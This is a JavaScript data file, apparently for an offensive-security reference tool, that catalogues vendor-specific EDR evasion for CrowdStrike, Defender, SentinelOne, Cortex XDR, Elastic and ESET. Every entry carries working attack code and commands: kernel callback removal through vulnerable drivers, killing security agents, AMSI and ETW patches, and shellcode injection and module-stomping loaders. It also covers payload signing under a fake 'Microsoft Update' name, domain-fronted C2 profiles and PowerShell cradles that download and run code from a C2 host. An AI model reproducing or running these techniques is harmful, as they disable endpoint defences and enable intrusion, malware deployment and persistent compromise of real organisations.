export const vendorTechniques = [
  {
    id: 'cs-falcon',
    title: 'CrowdStrike Falcon Evasion',
    subtitle: 'Target CS kernel driver (CSAgent.sys), ETW-Ti, ML model, and Overwatch behavioral monitoring',
    tags: ['CSAgent.sys', 'ETW-Ti', 'Overwatch', 'kernel callbacks', 'ML bypass', 'Null-AMSI', 'BYOVD', 'Backstab', 'EDRSilencer', 'PPL'],
    accentColor: 'orange',
    overview: 'CrowdStrike Falcon is among the most capable EDRs — it combines CSAgent.sys (kernel driver with callbacks and ETW-Ti subscription), cloud-correlated ML, and Overwatch (24/7 human threat hunting). ETW-Ti (Threat Intelligence) operates at the kernel level and cannot be bypassed via userland patches. Overwatch is behavioral — operating slowly with realistic inter-task jitter significantly reduces visibility. BYOVD via KDU removes CSAgent\'s kernel callbacks. EDRSilencer blocks cloud telemetry without requiring a driver.',
    steps: [
      'CSAgent.sys: kernel driver registers PsNotify callbacks AND subscribes to ETW-Ti — dual monitoring; userland patches don\'t reach ETW-Ti',
      'ML bypass: pack/encrypt payload uniquely per engagement — CrowdStrike ML is hash + feature-based; custom packer changes both',
      'ThreatCheck iteration: ThreatCheck.exe -f payload.exe -e Defender → patch flagged bytes → repeat until clean',
      'Overwatch (human-based): slow down operations; use realistic jitter (2-15s between tasks); avoid mass enumeration bursts',
      'AMSI: CrowdStrike monitors AmsiScanBuffer patches — prefer CLR host bypass (custom runspace) over memory patching',
      'BYOVD: kdu.exe -prov 9 -cmd REMOVE_CALLBACKS → nulls CSAgent\'s PsNotify callbacks → process monitoring blind',
      'Backstab: Backstab.exe -n csagent.exe -k → PPL bypass → kills CSAgent service if kernel callback removal alone is insufficient',
    ],
    commands: [
      {
        title: 'CrowdStrike-specific bypass chain',
        code: `# ── Phase 1: Kernel blind (BYOVD) ──
# Requires local admin + RTCore64.sys present
kdu.exe -prov 9 -cmd REMOVE_CALLBACKS
# CSAgent.sys callbacks nulled → no longer sees process creation/DLL loads

# ── Phase 2: Overwatch blind (EDRSilencer) ──
# No driver required — uses WFP to block CrowdStrike outbound connections
EDRSilencer.exe blockedr
# Prevents cloud correlation, Overwatch alert escalation, signature updates

# ── Phase 3: Kill CSAgent (Backstab) if needed ──
Backstab.exe -n csagent.exe -k
Backstab.exe -n CSFalconService.exe -k

# ── Static ML bypass ──
# CrowdStrike ML uses static features + cloud hash lookup
# 1. Custom packer with runtime-keyed AES decryption (unique key per build)
# 2. Junk code insertion (change feature vectors)
# 3. Compile with different optimization flags per engagement
# Validate: test binary in isolated CrowdStrike environment before deployment

# ── AMSI bypass (avoid patching AmsiScanBuffer — CS alerts on it) ──
# Use CLR host approach: custom C# runspace (no AMSI init in custom host)
# C# loader:
Add-Type -TypeDefinition @'
using System; using System.Management.Automation; using System.Management.Automation.Runspaces;
public class Loader {
    public static void Run(string script) {
        using (var rs = RunspaceFactory.CreateRunspace()) {
            rs.Open();
            using (var ps = PowerShell.Create()) {
                ps.Runspace = rs;
                ps.AddScript(script);
                ps.Invoke();
            }
        }
    }
}
'@
# Custom runspace does not initialize AMSI — CS cannot scan content

# ── Injection target (CS whitelisted) ──
# CrowdStrike trusts: svchost.exe, RuntimeBroker.exe, dllhost.exe
# Use NtMapViewOfSection chain (less monitored than WriteProcessMemory+CRT):
# NtCreateSection → NtMapViewOfSection(local) → write → NtMapViewOfSection(remote)
# → NtCreateThreadEx via indirect syscall`
      }
    ]
  },

  {
    id: 'ms-defender',
    title: 'Microsoft Defender for Endpoint Evasion',
    subtitle: 'No userland hooks — focus on ETW-Ti, network protection domain fronting, and SmartScreen bypass via code signing',
    tags: ['MDE', 'no userland hooks', 'ETW-Ti', 'WdFilter.sys', 'network protection', 'SmartScreen', 'domain fronting', 'BYOVD', 'AmsiInitFailed', 'sleep masking'],
    accentColor: 'orange',
    overview: 'Microsoft Defender for Endpoint is architecturally unique: it does NOT install userland ntdll hooks, making unhooking and direct syscalls irrelevant for its primary detection path. MDE relies on WdFilter.sys (kernel minifilter), ETW-Ti, cloud signatures, SmartScreen (file reputation), and Network Protection (DNS/IP blocking). The primary bypass pillars are: sleep masking (defeats memory scanning), domain fronting through trusted CDNs (defeats network protection), and Authenticode signing (defeats SmartScreen).',
    steps: [
      'Confirm: MDE has NO userland hooks — do not waste time unhooking ntdll; verify with hook scanner',
      'WdFilter.sys: kernel minifilter monitors file writes and process execution — BYOVD (kdu.exe) to remove its callbacks',
      'ETW-Ti: kernel-level telemetry — cannot be patched from userland; requires BYOVD or kernel callbacks removal',
      'Network Protection: DNS/IP-based C2 blocking — use domain fronting via Azure CDN, Cloudflare, or AWS CloudFront',
      'SmartScreen: file reputation on download/execute — sign payload with OV/EV cert or use fileless delivery (no SmartScreen check)',
      'Sleep masking: MDE periodically scans process memory — sleep mask (Ekko/Cronos) defeats in-memory scanning during idle',
      'Static bypass: MpCmdRun.exe -Scan -ScanType 3 -File payload.exe for local testing; ThreatCheck for byte-level identification',
    ],
    commands: [
      {
        title: 'MDE bypass — no-hook approach, network protection, SmartScreen',
        code: `# ── Confirm no userland hooks ──
# Run hook scanner — MDE should show 0 hooked functions
# (see hook-bypass technique for scanner code)
# Output: "No userland hooks — check ETW-Ti / kernel callbacks (MDE pattern)"

# ── BYOVD: disable WdFilter.sys kernel callbacks ──
kdu.exe -prov 9 -cmd REMOVE_CALLBACKS
Backstab.exe -n MsMpEng.exe -k   # Kill Defender AV engine

# ── Network Protection bypass: Domain Fronting ──
# C2 traffic exits to a trusted CDN — Defender Network Protection only sees legit CDN domain

# Azure CDN fronting:
# 1. Register a custom domain on Azure CDN (e.g., update.contoso.com)
# 2. CDN host header: your actual C2 domain (internal routing)
# 3. DNS resolves update.contoso.com → Azure IP (trusted by Network Protection)
# 4. Malleable C2 profile:
http-get { set uri "/update/check"; client { header "Host" "YOUR-C2.internal"; } }

# Cloudflare worker fronting:
# Deploy Cloudflare Worker that forwards to real C2
# DNS: C2 CNAME → workers.dev (trusted)

# ── SmartScreen bypass ──
# Option 1: Code signing (most reliable)
osslsigncode sign -pkcs12 codesign.p12 -pass "Pass" \
  -n "Microsoft Update" -t "http://timestamp.digicert.com" -h sha256 \
  -in payload.exe -out payload_signed.exe

# Option 2: Fileless delivery (no file = no SmartScreen)
# PowerShell IEX from memory (payload never touches disk)
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/stager.ps1')"

# ── AMSI bypass (MDE monitors AmsiScanBuffer patches) ──
# Reflection method (less monitored than memory patch):
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# ── Static bypass workflow ──
MpCmdRun.exe -Scan -ScanType 3 -File payload.exe   # Local test
ThreatCheck.exe -f payload.exe -e Defender          # Find flagged bytes
# Patch → retest → iterate until clean`
      }
    ]
  },

  {
    id: 'sentinelone',
    title: 'SentinelOne Singularity Evasion',
    subtitle: 'Bypass Static AI, hook-based behavioral monitoring, and kernel callbacks; leverage CPL execution gap',
    tags: ['SentinelOne', 'Static AI', 'Behavioral AI', 'SentinelMonitor.sys', 'indirect syscalls', 'CPL bypass', 'control.exe', 'ETW patch', 'BYOVD', 'unhooking'],
    accentColor: 'orange',
    overview: 'SentinelOne Singularity uses two complementary detection engines: Static AI scans binaries before execution (file-based ML), and Behavioral AI monitors runtime API call sequences and process trees. SentinelOne installs userland hooks in ntdll — making indirect syscalls and ntdll unhooking effective. The CPL (Control Panel extension) execution path (control.exe → payload.cpl) has historically had reduced behavioral monitoring coverage. BYOVD via KDU targets SentinelMonitor.sys callbacks.',
    steps: [
      'Static AI: pack/encrypt payload per engagement — change feature vectors that S1\'s model trained on (string content, PE structure, entropy)',
      'Behavioral AI: monitors API call sequences and process parent-child chains — use indirect syscalls, avoid flagged chains',
      'SentinelOne hooks ntdll — indirect syscalls (SysWhispers3) or unhooking (SEC_IMAGE copy) bypass its userland monitoring',
      'CPL execution: copy payload.dll as payload.cpl → control.exe payload.cpl → SentinelOne has historically had monitoring gaps here',
      'ETW patching: EtwEventWrite patch suppresses runtime telemetry visible to S1 behavioral engine — apply before sensitive operations',
      'BYOVD: kdu.exe -prov 9 -cmd REMOVE_CALLBACKS targets SentinelMonitor.sys callbacks',
      'Backstab: Backstab.exe -n SentinelAgent.exe -k / SentinelStaticEngine.exe -k after BYOVD',
    ],
    commands: [
      {
        title: 'SentinelOne bypass chain — indirect syscalls + CPL + BYOVD',
        code: `# ── Step 1: Indirect syscalls (bypass S1 userland hooks) ──
python3 SysWhispers.py --preset all -l msvc --out syscalls
# Compile with generated stubs — all Nt* calls bypass S1 hooks

# ── Step 2: NTDLL unhooking (alternative to syscalls) ──
# Load clean ntdll from disk (SEC_IMAGE), overwrite hooked .text section
# (See ntdll-unhook-mal technique for full implementation)
HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);
LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
// Copy .text section from pClean over hooked in-memory ntdll

# ── Step 3: CPL execution (historical S1 gap) ──
# Rename payload DLL to .cpl (Control Panel extension)
copy beacon.dll payload.cpl
control.exe payload.cpl                              # Executes DllMain
# Or:
rundll32.exe shell32.dll,Control_RunDLL payload.cpl  # Alternative invocation

# ── Step 4: ETW patch (suppress behavioral telemetry) ──
# C# ETW suppression:
$ntdll = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() -replace "v4","" 
$addr = (Add-Type @'
using System; using System.Runtime.InteropServices;
public class NT { [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
                  [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
                  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o); }
'@ -PassThru)::GetProcAddress([NT]::GetModuleHandle("ntdll"), "EtwEventWrite")
$old=0; [NT]::VirtualProtect($addr,[UIntPtr]::new(4),0x40,[ref]$old)
[Runtime.InteropServices.Marshal]::Copy([byte[]](0x33,0xC0,0xC3,0x90),$addr,4)  # xor eax,eax; ret

# ── Step 5: BYOVD + Backstab ──
kdu.exe -prov 9 -cmd REMOVE_CALLBACKS   # Null SentinelMonitor.sys callbacks
Backstab.exe -n SentinelAgent.exe -k
Backstab.exe -n SentinelStaticEngine.exe -k`
      }
    ]
  },

  {
    id: 'cortex-xdr',
    title: 'Palo Alto Cortex XDR Evasion',
    subtitle: 'Bypass BTP rules via section-mapping injection, exploit Java subprocess gaps, and use domain-fronted C2',
    tags: ['Cortex XDR', 'BTP', 'Behavioral Threat Protection', 'NtMapViewOfSection chain', 'Java subprocess', 'whitelist abuse', 'TLS inspection bypass', 'domain fronting'],
    accentColor: 'orange',
    overview: 'Cortex XDR uses a Behavioral Threat Protection (BTP) engine combining deterministic rules and ML. BTP rules are heavily focused on the classic injection chain (WriteProcessMemory + CreateRemoteThread) and specific parent-child process relationships. The NtMapViewOfSection injection chain is systematically less monitored than the classic WPM+CRT chain. Java subprocesses have historically had reduced scrutiny. Cortex also performs TLS inspection — domain fronting bypasses this by using a trusted CDN certificate for the outer TLS layer.',
    steps: [
      'Review Cortex XDR behavioral rules if you have admin access to the console: Policy → Behavioral Threat Protection → Rules',
      'Classic injection chain (WPM+CRT) is heavily monitored — replace entirely with NtMapViewOfSection via indirect syscalls',
      'Java subprocess abuse: if Java is installed, java.exe spawning is often less monitored than cmd.exe or powershell.exe',
      'Whitelist abuse: identify processes Cortex excludes (backup agents, monitoring tools) — inject into their PIDs',
      'TLS inspection: Cortex inspects TLS via certificate pinning — domain fronting through Azure/CloudFront bypasses the policy check',
      'Indirect syscalls (SysWhispers3) bypass Cortex\'s userland hooks on all injection API calls',
    ],
    commands: [
      {
        title: 'Cortex XDR bypass — section mapping chain + Java + fronting',
        code: `# ── NtMapViewOfSection injection chain (bypasses BTP WPM+CRT focus) ──
# All via indirect syscalls (SysWhispers3):

# 1. Create shared section
HANDLE hSection;
SIZE_T size = sizeof(shellcode);
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&size,
    PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);   // [syscall]

# 2. Map into local process (write shellcode)
PVOID pLocal = NULL; SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocal, 0, 0, NULL,
    &viewSize, ViewUnmap, 0, PAGE_READWRITE);    // [syscall]
memcpy(pLocal, shellcode, sizeof(shellcode));

# 3. Map into remote target process
HANDLE hProc; // OpenProcess to target
PVOID pRemote = NULL;
NtMapViewOfSection(hSection, hProc, &pRemote, 0, 0, NULL,
    &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ); // [syscall]

# 4. Create thread in remote (NtCreateThreadEx — less monitored than CreateRemoteThread)
HANDLE hThread;
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
    (LPTHREAD_START_ROUTINE)pRemote, NULL, FALSE, 0, 0, 0, NULL); // [syscall]
NtWaitForSingleObject(hThread, FALSE, NULL);

# ── Java subprocess abuse ──
# If Java is installed and not fully monitored by Cortex BTP
java.exe -cp . MalClass    # Spawn from java.exe — less scrutinized parent

# Via Runtime.exec in a JAR:
# Runtime.getRuntime().exec("powershell -c [bypassed script]");

# ── Domain fronting bypass (TLS inspection) ──
# Cortex does TLS inspection — normal C2 cert gets inspected and blocked
# Domain fronting: outer TLS uses Azure/Cloudflare cert → Cortex sees trusted cert
# Inner Host header routes to C2

# CS Malleable C2 fronting config:
http-get {
    set uri "/api/v1/update";
    client {
        header "Host" "your-c2-backend.internal";   # Actual C2 host (in CDN routing)
        # DNS: c2-front.azureedge.net → resolves to Azure IP → Cortex sees Azure cert
    }
}

# mshta fileless delivery (less file-system monitoring)
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('payload_cmd');close();"`
      }
    ]
  },

  {
    id: 'elastic',
    title: 'Elastic Security EDR Evasion',
    subtitle: 'Leverage the open-source rule library to craft execution chains that match no EQL rules; use section-based injection and APC',
    tags: ['Elastic', 'EQL', 'detection-rules', 'open source rules', 'NtMapViewOfSection', 'APC injection', 'expired cert signing', 'proxy injection', 'process.parent.name', 'eBPF'],
    accentColor: 'orange',
    overview: 'Elastic Security is entirely open source — its complete detection rule library (EQL, ES|QL, KQL) is publicly available at github.com/elastic/detection-rules. This is the operator\'s primary advantage: review exact rule conditions before the engagement and design execution chains that satisfy none of them. Elastic\'s rule model is highly specific (process name, parent name, command line) — precise behavioral evasion is extremely effective. The section-mapping injection chain bypasses the majority of Elastic\'s injection-focused EQL rules.',
    steps: [
      'Before engagement: git clone https://github.com/elastic/detection-rules → review all Windows rules relevant to your execution plan',
      'Search for EQL conditions your actions would match: grep -r "CreateRemoteThread\\|process.name\\|injection" detection-rules/rules/windows/',
      'Design parent-child process chains that are NOT covered by any rule — avoid all listed parent.name/child.name combinations',
      'Expired cert signing: Elastic validates cert existence but not always expiry — sign with an expired-but-trusted cert to gain file reputation',
      'Section injection + APC: Elastic rules heavily target WPM+CRT and CreateRemoteThread; NtMapViewOfSection+NtQueueApcThread is far less covered',
      'Proxy injection (APC into browser): inject into chrome.exe/msedge.exe that already has legitimate HTTPS — blend C2 traffic',
      'Elastic on Linux uses eBPF — different evasion approach (container namespace tricks, eBPF filtering) for Linux targets',
    ],
    commands: [
      {
        title: 'Elastic rule research and tailored bypass',
        code: `# ── Step 1: Clone and study Elastic detection rules ──
git clone https://github.com/elastic/detection-rules
cd detection-rules

# Search for process injection rules
grep -rl "CreateRemoteThread\\|VirtualAllocEx\\|WriteProcessMemory" rules/windows/ | head -20
grep -rl "process.parent.name" rules/windows/ | head -30

# Find parent-child combinations that ARE monitored
grep -A5 "process.parent.name" rules/windows/execution/execution_command_shell_started_by_unusual_process.toml

# ── Step 2: Design clean execution chain ──
# Example: Elastic rules flag "cmd.exe" or "powershell.exe" spawning from Office processes
# Safe chain: RuntimeBroker.exe (not in parent rules) → dllhost.exe (trusted child)
# Use PPID spoof to set RuntimeBroker.exe as parent

# ── Step 3: Section injection + APC (avoid WPM+CRT chain) ──
# Elastic rules: primarily detect WriteProcessMemory + CreateRemoteThread combo
# NtMapViewOfSection + NtQueueApcThread chain — far less EQL coverage

# 1. NtCreateSection + NtMapViewOfSection (local) → write shellcode
# 2. NtMapViewOfSection (remote target process)
# 3. NtQueueApcThread into an alertable thread in target
# 4. Target thread wakes → executes shellcode from section

# APC target: find alertable thread (SleepEx/WaitForSingleObjectEx)
# Chrome/Edge browser processes have alertable threads with HTTPS connections
# → blend shellcode execution AND C2 traffic through legitimate browser connection

# ── Expired cert signing (Elastic trust bypass) ──
# Elastic logs file hashes and cert info; does not always check cert validity
osslsigncode sign -certs expired_cert.pem -key expired_key.pem \\
  -in payload.exe -out payload_signed.exe
# Elastic may classify as trusted based on cert presence even if expired

# ── Review specific rule before deploying each technique ──
cat rules/windows/execution/execution_via_regsvr32.toml  # Check if regsvr32 is ruled
cat rules/windows/persistence/persistence_via_wmi.toml  # Check WMI rules`
      }
    ]
  },

  {
    id: 'eset',
    title: 'ESET Endpoint Security Evasion',
    subtitle: 'Defeat VAD-based memory scanning via module stomping, bypass sub-page EPT hooks, and use fileless delivery to avoid LiveGrid',
    tags: ['ESET', 'VAD scanning', 'module stomping', 'EPT hooks', 'sub-page hooks', 'LiveGrid', 'HIPS', 'ekrn.sys', 'AMSI CLR bypass', 'file-backed memory'],
    accentColor: 'orange',
    overview: 'ESET Endpoint Security uses VAD (Virtual Address Descriptor) tree scanning to identify suspicious memory — specifically allocations that are executable but not backed by a file on disk (the classic shellcode signature). Module stomping defeats this by placing shellcode inside a legitimate DLL\'s .text section, which IS file-backed. ESET also deploys hardware-assisted sub-page EPT hooks — harder to detect and remove than software hooks, requiring indirect syscalls as the primary evasion. LiveGrid cloud reputation checks are bypassed by never writing to disk.',
    steps: [
      'VAD scanning: ESET traverses the Virtual Address Descriptor tree and flags RX memory not backed by a legitimate file → module stomp to defeat',
      'Module stomping: LoadLibrary a benign rarely-used DLL, VirtualProtect its .text RWX, memcpy shellcode over it, restore RX — VAD sees file-backed memory',
      'Sub-page EPT hooks: ESET can hook at sub-page granularity using Intel EPT — standard hook scanners miss these; use indirect syscalls as bypass',
      'LiveGrid: cloud reputation check on first execution — never write to disk to avoid any file hash submission',
      'AMSI: ESET monitors AmsiScanBuffer patches — use custom CLR runspace (PowerShell.Create() without AMSI init) or avoid AMSI entirely',
      'HIPS (Host-based IPS): rule-based — avoid the VirtualAllocEx→WriteProcessMemory→CreateRemoteThread chain; use SetWindowsHookEx or module stomp instead',
      'BYOVD: ekrn.sys is ESET\'s kernel component — KDU removes its callbacks; Backstab.exe -n ekrn.exe -k kills it',
    ],
    commands: [
      {
        title: 'ESET VAD bypass via module stomping',
        code: `// module_stomp.cpp — defeat ESET VAD scanning by stomping a legitimate DLL
// Compile: x86_64-w64-mingw32-g++ -O2 -s -o stomp.exe module_stomp.cpp -lkernel32
#include <windows.h>
#include <stdio.h>

// Load a legitimate DLL and overwrite its .text section with shellcode
// ESET VAD scan sees file-backed memory (legitimate DLL) → no flag
bool StompModule(const char* targetDll, BYTE* shellcode, SIZE_T scLen) {
    // Map the DLL — LOAD_LIBRARY_AS_DATAFILE avoids running DllMain
    HMODULE hDecoy = LoadLibraryExA(targetDll, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if(!hDecoy) { printf("[-] LoadLibrary failed: %lu\\n",GetLastError()); return false; }

    // Find the .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDecoy;
    // Note: LOAD_LIBRARY_AS_DATAFILE sets low bit — mask it off
    dos = (PIMAGE_DOS_HEADER)((ULONG_PTR)hDecoy & ~0x3);
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE textBase=NULL; DWORD textSize=0;
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(memcmp(sec->Name,".text",5)==0){
            textBase=(PBYTE)dos+sec->VirtualAddress;
            textSize=sec->Misc.VirtualSize;
            break;
        }
    }
    if(!textBase||scLen>textSize){
        printf("[-] .text section too small or not found\\n"); return false;
    }
    printf("[+] Stomping %s .text @ 0x%p (size=%lu)\\n",targetDll,(void*)textBase,textSize);

    // Make .text writable
    DWORD old;
    VirtualProtect(textBase,textSize,PAGE_EXECUTE_READWRITE,&old);
    ZeroMemory(textBase,textSize);          // Clear original bytes (optional OPSEC)
    memcpy(textBase,shellcode,scLen);       // Overwrite with shellcode
    VirtualProtect(textBase,textSize,PAGE_EXECUTE_READ,&old);
    FlushInstructionCache(GetCurrentProcess(),textBase,textSize);

    // Execute from the file-backed section
    printf("[+] Executing from stomped .text — ESET VAD sees file-backed RX memory\\n");
    ((void(*)())textBase)();  // Jump into shellcode
    return true;
}

int main(){
    // xpsservices.dll: signed, rarely used, large .text section
    unsigned char sc[] = { /* shellcode here */ };
    StompModule("C:\\\\Windows\\\\System32\\\\xpsservices.dll", sc, sizeof(sc));
    return 0;
}`
      },
      {
        title: 'ESET — indirect syscalls + fileless delivery + BYOVD',
        code: `# ── Indirect syscalls (bypass ESET sub-page EPT hooks) ──
python3 SysWhispers.py --preset all -l msvc --out syscalls
# EPT hooks intercept specific physical pages — JMP to ntdll's own syscall gadget
# bypasses sub-page EPT by executing the syscall instruction from ntdll's page (trusted)

# ── AMSI bypass — CLR host (avoid patching AmsiScanBuffer) ──
# ESET monitors AmsiScanBuffer patch — use custom runspace instead
# C# loader:
using System.Management.Automation;
using System.Management.Automation.Runspaces;
var rs = RunspaceFactory.CreateRunspace();
rs.Open();                     // AMSI NOT initialized in custom runspace
var ps = PowerShell.Create();
ps.Runspace = rs;
ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://C2/tool.ps1')");
ps.Invoke();

# ── Fileless delivery (bypass LiveGrid hash check) ──
# Never write payload to disk — LiveGrid checks file hash on creation
# Reflective load from memory:
$bytes = (New-Object Net.WebClient).DownloadData('http://C2/beacon.bin')
# Load via reflection or P/Invoke — no file write, no hash submission to LiveGrid

# ── HIPS evasion: SetWindowsHookEx chain (instead of WPM+CRT) ──
# ESET HIPS: VirtualAllocEx+WriteProcessMemory+CreateRemoteThread = flagged
# Alternative: inject via SetWindowsHookEx WH_KEYBOARD_LL
# The hook fires on input events — ESET HIPS has less coverage on this chain

# ── BYOVD: remove ESET kernel callbacks ──
kdu.exe -prov 9 -cmd REMOVE_CALLBACKS    # Null ekrn.sys callbacks
Backstab.exe -n ekrn.exe -k             # Kill ESET kernel service process

# ── Enumerate ESET exclusions ──
# ESET policy exclusions often set via ESMC/ESET Protect console
# Query locally:
reg query "HKLM\\SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Plugins\\01000100\\Settings"
# Look for exclusion paths — copy payload there`
      }
    ]
  },
];